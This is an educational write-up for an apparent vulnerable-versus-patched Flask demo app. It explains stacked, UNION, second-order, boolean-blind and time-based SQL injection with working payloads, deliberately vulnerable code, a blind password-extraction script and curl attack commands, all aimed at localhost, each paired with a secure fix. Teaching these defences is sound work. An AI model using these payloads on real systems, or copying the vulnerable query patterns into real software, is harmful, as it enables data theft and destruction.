# Advanced SQL Injection Techniques

This document provides detailed explanations of the advanced SQL injection techniques implemented in this demonstration project. Each section includes technical explanations, attack vectors, example payloads, and defense mechanisms.

## Table of Contents

1. [Stacked Statements SQL Injection](#1-stacked-statements-sql-injection)
2. [UNION-Based Data Exfiltration](#2-union-based-data-exfiltration)
3. [Second-Order SQL Injection](#3-second-order-sql-injection)
4. [Boolean-Based Blind SQL Injection](#4-boolean-based-blind-sql-injection)
5. [Time-Based Blind SQL Injection](#5-time-based-blind-sql-injection)
6. [Defense Strategies](#defense-strategies)
7. [Testing Instructions](#testing-instructions)

---

## 1. Stacked Statements SQL Injection

### Overview

Stacked statements (also called piggy-backed queries) allow attackers to execute multiple SQL statements in a single query by using statement terminators like semicolons (`;`). This technique enables attackers to perform destructive operations beyond simple data retrieval.

### How It Works

When an application executes SQL without proper safeguards, an attacker can append additional SQL statements:

```sql
-- Intended query
DELETE FROM users WHERE username = 'alice'

-- Injected payload
alice'; DROP TABLE users; --

-- Resulting query
DELETE FROM users WHERE username = 'alice'; DROP TABLE users; --'
```

### Attack Vectors

**Endpoint**: `/api/bulk_delete` (vulnerable version)

**Common Payloads**:
```sql
alice'; DROP TABLE users; --
bob'; DELETE FROM users WHERE username='admin'; --
charlie'; UPDATE users SET password='hacked' WHERE username='admin'; --
'; INSERT INTO users (username, password, email) VALUES ('hacker', 'evil', 'hacker@evil.com'); --
```

### Vulnerable Code Example

```python
@vuln_sql_bp.route('/api/bulk_delete', methods=['POST'])
def vulnerable_bulk_delete():
    """VULNERABLE: Allows stacked statements"""
    username = request.form.get('username', '')
    sql = f"DELETE FROM users WHERE username = '{username}'"

    db = get_db()
    # VULNERABILITY: executescript() allows multiple statements
    db.executescript(sql)
    db.commit()
```

**Why it's vulnerable**:
- Uses string formatting to build SQL query
- Calls `executescript()` which explicitly allows multiple statements
- No input validation or sanitization

### Secure Implementation

```python
@patched_sql_bp.route('/api/bulk_delete', methods=['POST'])
def secure_bulk_delete():
    """SECURE: Prevents stacked statements"""
    username = request.form.get('username', '')

    # DEFENSE 1: Input validation
    valid, username = validate_input(username, max_length=50)
    if not valid:
        return jsonify({'success': False, 'message': 'Invalid username'}), 400

    # DEFENSE 2: Parameterized query
    sql = "DELETE FROM users WHERE username = ?"

    db = get_db()
    # DEFENSE 3: Use execute() instead of executescript()
    # execute() only allows single statements
    result = db.execute(sql, (username,))
    db.commit()
```

**Defense mechanisms**:
1. **Input validation**: Whitelist allowed characters
2. **Parameterized queries**: Separates data from SQL code
3. **Use `execute()` not `executescript()`**: Only allows single statements

### Impact

- **Critical**: Can drop tables, modify/delete data, create backdoor accounts
- **Real-world example**: 2008 Heartland Payment Systems breach involved stacked statements

---

## 2. UNION-Based Data Exfiltration

### Overview

UNION-based SQL injection exploits the SQL UNION operator to combine results from an attacker-controlled query with the original query results. This allows attackers to extract data from arbitrary tables.

### How It Works

The UNION operator combines results from two SELECT statements. For it to work:
1. Both queries must have the **same number of columns**
2. Column data types must be **compatible**

**Attack Process**:

**Step 1: Determine number of columns**
```sql
' ORDER BY 1 --  (success)
' ORDER BY 2 --  (success)
' ORDER BY 3 --  (success)
' ORDER BY 4 --  (success)
' ORDER BY 5 --  (error - only 4 columns)
```

**Step 2: Find injectable columns**
```sql
' UNION SELECT NULL, NULL, NULL, NULL --
```

**Step 3: Extract data**
```sql
' UNION SELECT id, username, password, email FROM users --
```

### Attack Vectors

**Endpoint**: `/api/search` (vulnerable version)

**Example Payloads**:
```sql
-- Extract all user credentials
' UNION SELECT id, username, password, email FROM users --

-- Extract database metadata
' UNION SELECT NULL, name, sql, NULL FROM sqlite_master WHERE type='table' --

-- Extract specific user
alice' UNION SELECT id, username, password, email FROM users WHERE username='admin' --

-- Concatenate all table names
' UNION SELECT NULL, NULL, GROUP_CONCAT(name), NULL FROM sqlite_master WHERE type='table' --
```

### Vulnerable Code Example

```python
@vuln_sql_bp.route('/api/search', methods=['GET'])
def vulnerable_search():
    """VULNERABLE: Allows UNION-based extraction"""
    query = request.args.get('query', '')

    # VULNERABILITY: String concatenation with user input
    sql = f"SELECT id, username, email, bio FROM users WHERE username LIKE '%{query}%'"

    cursor = db.execute(sql)
    results = cursor.fetchall()

    return jsonify({
        'success': True,
        'results': [dict(row) for row in results],
        'query': sql  # Exposes the executed query
    })
```

### Secure Implementation

```python
@patched_sql_bp.route('/api/search', methods=['GET'])
def secure_search():
    """SECURE: Prevents UNION-based extraction"""
    query_param = request.args.get('query', '')

    # DEFENSE 1: Input validation
    valid, query_param = validate_input(query_param, max_length=50)
    if not valid:
        return jsonify({'success': False, 'message': 'Invalid search query'}), 400

    # DEFENSE 2: Parameterized query with LIKE
    sql = "SELECT id, username, email, bio FROM users WHERE username LIKE ?"

    # Use parameterized query with wildcard in the parameter
    cursor = db.execute(sql, (f'%{query_param}%',))
    results = cursor.fetchall()

    return jsonify({
        'success': True,
        'results': [dict(row) for row in results]
        # DEFENSE 3: Don't expose SQL query
    })
```

### Impact

- **High**: Exposes entire database contents including passwords, emails, personal data
- **Real-world example**: 2011 Sony PlayStation Network breach exposed 77 million accounts

---

## 3. Second-Order SQL Injection

### Overview

Second-order SQL injection (also called stored SQL injection) occurs when:
1. Malicious data is **safely stored** in the database (e.g., via parameterized query)
2. The stored data is later **retrieved and used unsafely** in a SQL query

This is particularly dangerous because developers often trust data from their own database.

### How It Works

**Stage 1: Storage** (Safe - using parameterized query)
```python
# User saves malicious display name
display_name = "admin' OR '1'='1' --"

# Safely stored using parameterized query
db.execute("INSERT INTO user_preferences (user_id, display_name) VALUES (?, ?)",
           (user_id, display_name))
```

**Stage 2: Exploitation** (Unsafe - using stored data in string concatenation)
```python
# Later, the application retrieves the stored display_name
pref = db.execute("SELECT display_name FROM user_preferences WHERE user_id = ?",
                  (user_id,)).fetchone()

display_name = pref['display_name']  # Now contains: admin' OR '1'='1' --

# VULNERABILITY: Using database-sourced data in string concatenation
sql = f"SELECT * FROM users WHERE username = '{display_name}'"
cursor = db.execute(sql)  # Injection occurs here!
```

**Resulting malicious query**:
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --'
```

### Attack Vectors

**Endpoints**: `/api/save_preference` (stage 1) + `/api/get_user_stats` (stage 2)

**Example Attack Flow**:

1. **Login as alice**:
```bash
curl -X POST http://localhost:5000/api/login \
  -d "username=alice&password=password123" \
  -c cookies.txt
```

2. **Save malicious display name** (Stage 1):
```bash
curl -X POST http://localhost:5000/api/save_preference \
  -b cookies.txt \
  -d "display_name=admin' OR '1'='1' --&theme=dark"
```

3. **Trigger the stored payload** (Stage 2):
```bash
curl http://localhost:5000/api/get_user_stats -b cookies.txt
```

**Result**: Instead of counting alice's records (1), it counts all users

### Vulnerable Code Example

**Stage 1** - Safe storage:
```python
@vuln_sql_bp.route('/api/save_preference', methods=['POST'])
def vulnerable_save_preference():
    display_name = request.form.get('display_name', '')

    # SAFE: Parameterized query for storage
    db.execute(
        "INSERT INTO user_preferences (user_id, display_name, theme) VALUES (?, ?, ?)",
        (user_id, display_name, theme)
    )
```

**Stage 2** - Unsafe retrieval and use:
```python
@vuln_sql_bp.route('/api/get_user_stats', methods=['GET'])
def vulnerable_get_user_stats():
    # Retrieve the stored display_name
    pref = db.execute(
        "SELECT display_name FROM user_preferences WHERE user_id = ?",
        (user_id,)
    ).fetchone()

    display_name = pref['display_name']

    # VULNERABILITY: Trusting database-sourced data
    sql = f"SELECT COUNT(*) FROM users WHERE username = '{display_name}'"
    cursor = db.execute(sql)  # Injection!
```

### Secure Implementation

```python
@patched_sql_bp.route('/api/get_user_stats', methods=['GET'])
def secure_get_user_stats():
    """SECURE: Uses parameterized queries even for database-sourced data"""

    # Retrieve display_name safely
    pref = db.execute(
        "SELECT display_name FROM user_preferences WHERE user_id = ?",
        (user_id,)
    ).fetchone()

    display_name = pref['display_name']

    # KEY DEFENSE: Still use parameterized query even with database-sourced data!
    # Never trust data, even from your own database
    sql = "SELECT COUNT(*) as count FROM users WHERE username = ?"
    cursor = db.execute(sql, (display_name,))
```

**Defense principle**: **Never trust data, even from your own database**

### Impact

- **High**: Bypasses developer expectations of "safe" data
- **Stealthy**: Attack payload stored long before execution
- **Real-world example**: Second-order SQLi found in many web applications that validate input only at entry points

---

## 4. Boolean-Based Blind SQL Injection

### Overview

Blind SQL injection occurs when the application doesn't return SQL errors or query results, but the attacker can still infer information by observing **differences in application behavior** based on TRUE vs FALSE conditions.

Boolean-based blind SQLi exploits **binary responses** (e.g., "username taken" vs "username available") to extract data character by character.

### How It Works

**Attack Process**:

1. **Test for vulnerability** - Check if TRUE and FALSE conditions produce different responses

2. **Extract password length**:
```sql
admin' AND LENGTH(password)=1 --   (FALSE - username available)
admin' AND LENGTH(password)=10 --  (FALSE - username available)
admin' AND LENGTH(password)=12 --  (TRUE - username taken!)
```

3. **Extract each character**:
```sql
-- Position 1
admin' AND SUBSTR(password,1,1)='a' --  (FALSE)
admin' AND SUBSTR(password,1,1)='b' --  (FALSE)
...
admin' AND SUBSTR(password,1,1)='p' --  (TRUE - found first character!)

-- Position 2
admin' AND SUBSTR(password,2,1)='a' --  (TRUE - found second character!)

-- Continue for all 12 characters...
```

### Attack Vectors

**Endpoint**: `/api/check_username` (vulnerable version)

**Example Payloads**:

**Basic TRUE/FALSE test**:
```sql
admin' AND '1'='1     -- TRUE condition
admin' AND '1'='2     -- FALSE condition
```

**Password length extraction**:
```sql
admin' AND LENGTH(password)=12 --
admin' AND LENGTH(password)>10 --
```

**Character-by-character extraction**:
```sql
admin' AND SUBSTR(password,1,1)='a' --
admin' AND SUBSTR(password,1,1)='b' --
admin' AND SUBSTR(password,1,1)='p' --  (TRUE!)
admin' AND SUBSTR(password,2,1)='a' --  (TRUE!)
admin' AND SUBSTR(password,3,1)='s' --  (TRUE!)
```

**Email extraction**:
```sql
admin' AND SUBSTR(email,1,1)='a' --
admin' AND SUBSTR(email,7,1)='@' --
```

### Vulnerable Code Example

```python
@vuln_sql_bp.route('/api/check_username', methods=['GET'])
def vulnerable_check_username():
    """VULNERABLE: Returns different responses for TRUE/FALSE conditions"""
    username = request.args.get('username', '')

    # VULNERABILITY: String concatenation
    sql = f"SELECT COUNT(*) as count FROM users WHERE username = '{username}'"

    cursor = db.execute(sql)
    result = cursor.fetchone()
    count = result['count']

    # Different responses enable blind extraction
    if count > 0:
        return jsonify({
            'success': True,
            'available': False,  # TRUE condition
            'message': 'Username is taken'
        })
    else:
        return jsonify({
            'success': True,
            'available': True,   # FALSE condition
            'message': 'Username is available'
        })
```

**Why it's vulnerable**:
- Different responses for TRUE (`available: False`) vs FALSE (`available: True`)
- Allows attackers to ask YES/NO questions about database content
- Can extract entire database character by character

### Automated Extraction Script

We provide `scripts/blind_sqli_extractor.py` to demonstrate automated password extraction:

```python
def extract_password(base_url, username):
    # Step 1: Determine password length
    password_length = extract_password_length(base_url, username)

    # Step 2: Extract each character
    password = ""
    for position in range(1, password_length + 1):
        for char in charset:
            payload = f"{username}' AND SUBSTR(password,{position},1)='{char}' --"
            response = requests.get(f"{base_url}/api/check_username",
                                   params={'username': payload})
            result = response.json()

            if not result.get('available'):  # TRUE condition found
                password += char
                break

    return password
```

**Usage**:
```bash
# Extract admin password from vulnerable app
python3 scripts/blind_sqli_extractor.py http://localhost:5000 admin

# Compare vulnerable vs patched
python3 scripts/blind_sqli_extractor.py http://localhost:5000 http://localhost:5001 admin
```

### Secure Implementation

```python
@patched_sql_bp.route('/api/check_username', methods=['GET'])
def secure_check_username():
    """SECURE: Prevents boolean-based blind SQL injection"""
    username = request.args.get('username', '')

    # DEFENSE 1: Input validation
    valid, username = validate_input(username, max_length=50)
    if not valid:
        return jsonify({'success': False, 'message': 'Invalid username format'}), 400

    # DEFENSE 2: Parameterized query
    sql = "SELECT COUNT(*) as count FROM users WHERE username = ?"
    cursor = db.execute(sql, (username,))
    result = cursor.fetchone()
    count = result['count']

    # Same response structure, but injection is prevented
    if count > 0:
        return jsonify({'success': True, 'available': False})
    else:
        return jsonify({'success': True, 'available': True})
```

### Impact

- **High**: Can extract entire database contents given enough time
- **Stealthy**: No error messages, difficult to detect
- **Time-consuming**: Requires many requests (e.g., 12 chars × 62 possible chars = up to 744 requests)
- **Real-world example**: Used in many web application penetration tests

---

## 5. Time-Based Blind SQL Injection

### Overview

Time-based blind SQL injection is used when the application doesn't show **any difference** in responses between TRUE and FALSE conditions. Instead, attackers use **response time differences** to infer information.

If a TRUE condition causes a delay and FALSE condition returns immediately, attackers can extract data bit by bit.

### How It Works

**Attack Process**:

1. **Craft a time-delay payload**:
```sql
' OR (SELECT CASE
        WHEN (1=1)  -- TRUE condition
        THEN randomblob(100000000)  -- Causes delay
        ELSE 1
      END) --
```

2. **Measure response time**:
- TRUE condition: 3-5 seconds (delay)
- FALSE condition: 0.1 seconds (normal)

3. **Extract data using timing**:
```sql
-- Test if admin exists (with delay if TRUE)
' OR (SELECT CASE
        WHEN (SELECT COUNT(*) FROM users WHERE username='admin')=1
        THEN randomblob(100000000)
        ELSE 1
      END) --

-- Extract password first character
' OR (SELECT CASE
        WHEN SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='p'
        THEN randomblob(100000000)
        ELSE 1
      END) --
```

### Attack Vectors

**Endpoint**: `/api/verify_user` (vulnerable version)

**SQLite Time-Delay Techniques**:

SQLite doesn't have a built-in `SLEEP()` function, so we use computational delays:

**Method 1: randomblob() - Generate large random data**
```sql
' OR (SELECT CASE WHEN (1=1) THEN randomblob(100000000) ELSE 1 END) --
```

**Method 2: Recursive query - CPU-intensive operation**
```sql
' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)) > 0 --
```

**Example Payloads**:

**Check if admin exists**:
```sql
' OR (SELECT CASE
        WHEN (SELECT COUNT(*) FROM users WHERE username='admin')=1
        THEN randomblob(100000000)
        ELSE 1
      END) --
```

**Extract first character of admin password**:
```sql
' OR (SELECT CASE
        WHEN SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='a'
        THEN randomblob(100000000)
        ELSE 1
      END) --
```

### Vulnerable Code Example

```python
@vuln_sql_bp.route('/api/verify_user', methods=['GET'])
def vulnerable_verify_user():
    """VULNERABLE: Allows time-based blind SQL injection"""
    username = request.args.get('username', '')

    # VULNERABILITY: String concatenation
    sql = f"SELECT id, username, email FROM users WHERE username = '{username}'"

    # Time delay occurs during execution if payload contains randomblob()
    cursor = db.execute(sql)
    user = cursor.fetchone()

    if user:
        return jsonify({'success': True, 'exists': True})
    else:
        return jsonify({'success': True, 'exists': False})
```

**Attack demonstration**:
```python
import time
import requests

# Normal query (fast)
start = time.time()
requests.get('http://localhost:5000/api/verify_user?username=admin')
normal_time = time.time() - start  # ~0.1 seconds

# Injection payload (slow if vulnerable)
payload = "' OR (SELECT CASE WHEN (1=1) THEN randomblob(100000000) ELSE 1 END) --"
start = time.time()
requests.get('http://localhost:5000/api/verify_user', params={'username': payload})
injection_time = time.time() - start  # ~3-5 seconds if vulnerable!

if injection_time > normal_time * 2:
    print("VULNERABLE to time-based blind SQL injection!")
```

### Secure Implementation

```python
@patched_sql_bp.route('/api/verify_user', methods=['GET'])
def secure_verify_user():
    """SECURE: Prevents time-based blind SQL injection"""
    username = request.args.get('username', '')

    # DEFENSE 1: Input validation
    valid, username = validate_input(username, max_length=50)
    if not valid:
        return jsonify({'success': False, 'message': 'Invalid username format'}), 400

    # DEFENSE 2: Parameterized query
    sql = "SELECT id, username, email FROM users WHERE username = ?"
    cursor = db.execute(sql, (username,))
    user = cursor.fetchone()

    if user:
        return jsonify({'success': True, 'exists': True})
    else:
        return jsonify({'success': True, 'exists': False})
```

**Additional defense**: In production, implement **rate limiting** to prevent timing attacks and brute force attempts.

### Impact

- **Medium-High**: Can extract data but very slow (each character requires delay)
- **Very stealthy**: No visible differences in response content
- **Network-dependent**: Timing measurements can be affected by network latency
- **Real-world example**: Used when boolean-based blind SQLi is not possible

---

## Defense Strategies

### 1. Parameterized Queries (Prepared Statements)

**Most important defense** - Separates SQL code from data.

**Vulnerable**:
```python
sql = f"SELECT * FROM users WHERE username = '{username}'"
db.execute(sql)
```

**Secure**:
```python
sql = "SELECT * FROM users WHERE username = ?"
db.execute(sql, (username,))
```

**Why it works**:
- Database treats `?` parameters as **data only**, never as SQL code
- No string concatenation or formatting
- Works for all SQL injection types

### 2. Input Validation

**Whitelist approach** - Only allow expected characters.

```python
def validate_input(input_str, max_length=100, allow_special=False):
    if not input_str or len(input_str) > max_length:
        return False, None

    if not allow_special:
        # Allow only alphanumeric, spaces, @, ., -, _
        if not re.match(r'^[a-zA-Z0-9@.\-_ ]+$', input_str):
            return False, None

    return True, input_str.strip()
```

**Important**: Input validation is a **secondary defense**, not a replacement for parameterized queries.

### 3. Use execute() Not executescript()

For SQLite:
- `execute()`: Only allows **single statement**
- `executescript()`: Allows **multiple statements** (dangerous!)

```python
# VULNERABLE to stacked statements
db.executescript(sql)

# SECURE - only allows single statement
db.execute(sql, params)
```

### 4. Generic Error Messages

**Don't expose**:
- SQL errors
- Database structure
- Query details

**Vulnerable**:
```python
except sqlite3.Error as e:
    return jsonify({'error': str(e)})  # Exposes database info!
```

**Secure**:
```python
except sqlite3.Error:
    return jsonify({'success': False, 'message': 'An error occurred'}), 500
```

### 5. Principle of Least Privilege

- Database user should have **minimum necessary permissions**
- Don't use `root` or `admin` database accounts for web applications
- Limit to: `SELECT`, `INSERT`, `UPDATE` on specific tables only
- Never grant: `DROP`, `CREATE`, `ALTER` permissions

### 6. Never Trust Data (Even from Database)

Second-order SQL injection lesson: **Always use parameterized queries**, even when data comes from your own database.

```python
# Get data from database
display_name = db.execute("SELECT display_name FROM prefs WHERE user_id = ?",
                          (user_id,)).fetchone()['display_name']

# STILL use parameterized query!
db.execute("SELECT * FROM users WHERE username = ?", (display_name,))
```

### 7. Additional Security Measures

- **Web Application Firewall (WAF)**: Filter malicious requests
- **Rate Limiting**: Prevent blind SQLi enumeration attacks
- **Logging & Monitoring**: Detect suspicious query patterns
- **Regular Security Audits**: Test for new vulnerabilities
- **Keep Software Updated**: Apply security patches

---

## Testing Instructions

### Quick Testing with curl Script

Test all 7 attack vectors with a single command:

```bash
cd /home/ec2-user/cs_project

# Start both applications
docker-compose up -d

# Run comprehensive tests
./attacks/sqli_curl.sh http://localhost:5000 http://localhost:5001
```

**Expected output**:
- Vulnerable app: All 7 attacks succeed (✗)
- Patched app: All 7 attacks blocked (✓)

### Automated Testing with Python

**Test all advanced techniques**:
```bash
python3 scripts/test_advanced_sqli.py http://localhost:5000 http://localhost:5001
```

**Output includes**:
- Stacked statements test results
- Second-order SQL injection results
- Boolean-based blind SQLi detection
- Time-based blind SQLi timing analysis
- UNION-based extraction results
- Effectiveness percentage

### Password Extraction Demo

**Extract admin password using boolean-based blind SQLi**:

```bash
# Single target (vulnerable app)
python3 scripts/blind_sqli_extractor.py http://localhost:5000 admin

# Compare vulnerable vs patched
python3 scripts/blind_sqli_extractor.py http://localhost:5000 http://localhost:5001 admin
```

**Expected output on vulnerable app**:
```
[*] Extracting password length for user 'admin'...
[+] Password length found: 12

[*] Extracting password (12 characters)...
[*] Progress: admin_secret [12/12]

[+] EXTRACTED PASSWORD: admin_secret

[*] Verifying password...
[+] SUCCESS: Password verified! Login successful.
```

### Manual Testing Examples

**1. Test Stacked Statements**:
```bash
# Login first
curl -X POST http://localhost:5000/api/login \
  -d "username=alice&password=password123" \
  -c cookies.txt

# Try to drop table
curl -X POST http://localhost:5000/api/bulk_delete \
  -b cookies.txt \
  -d "username=alice'; DROP TABLE users; --"
```

**2. Test UNION-Based Extraction**:
```bash
# Login
curl -X POST http://localhost:5000/api/login \
  -d "username=alice&password=password123" \
  -c cookies.txt

# Extract all passwords
curl -b cookies.txt \
  "http://localhost:5000/api/search?query=%27%20UNION%20SELECT%20id%2C%20username%2C%20password%2C%20email%20FROM%20users%20--"
```

**3. Test Second-Order SQLi**:
```bash
# Login
curl -X POST http://localhost:5000/api/login \
  -d "username=alice&password=password123" \
  -c cookies.txt

# Stage 1: Save malicious display name
curl -X POST http://localhost:5000/api/save_preference \
  -b cookies.txt \
  -d "display_name=admin' OR '1'='1' --&theme=dark"

# Stage 2: Trigger stored payload
curl -b cookies.txt http://localhost:5000/api/get_user_stats
```

**4. Test Boolean-Based Blind SQLi**:
```bash
# Test TRUE condition
curl "http://localhost:5000/api/check_username?username=admin%27%20AND%20%271%27%3D%271"

# Test FALSE condition
curl "http://localhost:5000/api/check_username?username=admin%27%20AND%20%271%27%3D%272"

# Compare responses - different = vulnerable
```

**5. Test Time-Based Blind SQLi**:
```bash
# Measure normal query time
time curl "http://localhost:5000/api/verify_user?username=admin"

# Measure injection query time (should be much slower if vulnerable)
time curl "http://localhost:5000/api/verify_user?username=%27%20OR%20%28SELECT%20CASE%20WHEN%20%281%3D1%29%20THEN%20randomblob%28100000000%29%20ELSE%201%20END%29%20--"
```

### Using Payload File

All attack payloads are documented in `scripts/sqli_payloads.txt`:

```bash
# View all payloads organized by technique
cat scripts/sqli_payloads.txt

# Test specific payloads
grep "STACKED STATEMENTS" -A 10 scripts/sqli_payloads.txt
grep "BOOLEAN-BASED BLIND" -A 20 scripts/sqli_payloads.txt
```

---

## Summary

### Attack Techniques Comparison

| Technique | Visibility | Speed | Stealth | Difficulty | Impact |
|-----------|-----------|-------|---------|------------|--------|
| Stacked Statements | High | Fast | Low | Easy | Critical |
| UNION-Based | High | Fast | Low | Medium | High |
| Second-Order | Medium | Fast | High | Medium | High |
| Boolean Blind | None | Slow | High | Medium | High |
| Time-Based Blind | None | Very Slow | Very High | Hard | Medium |

### Defense Priority

1. **Always use parameterized queries** (prevents all types)
2. **Input validation** (defense in depth)
3. **Use `execute()` not `executescript()`** (prevents stacked statements)
4. **Generic error messages** (reduces information leakage)
5. **Least privilege** (limits damage)
6. **Never trust data** (prevents second-order)
7. **Rate limiting** (slows down blind attacks)

### Key Takeaways

- **Parameterized queries are non-negotiable** - They prevent all SQL injection types
- **Defense in depth** - Use multiple layers of security
- **Never trust data, even from your database** - Second-order SQLi lesson
- **Input validation is secondary** - Not a replacement for parameterized queries
- **Testing is essential** - Use automated tools to verify security

### Additional Resources

- **OWASP SQL Injection**: https://owasp.org/www-community/attacks/SQL_Injection
- **OWASP Top 10**: https://owasp.org/www-project-top-ten/
- **SQLMap Tool**: Automated SQL injection testing
- **Burp Suite**: Web application security testing

---

## Conclusion

This demonstration project implements 5 advanced SQL injection techniques with both vulnerable and secure versions. The key defense is **parameterized queries** combined with **input validation** and security best practices.

Understanding these attack vectors helps developers:
1. Recognize vulnerable code patterns
2. Implement proper defenses
3. Test applications thoroughly
4. Appreciate the importance of secure coding practices

**Remember**: Security is not a feature - it's a requirement. Always code defensively and never trust user input (or even database content!).
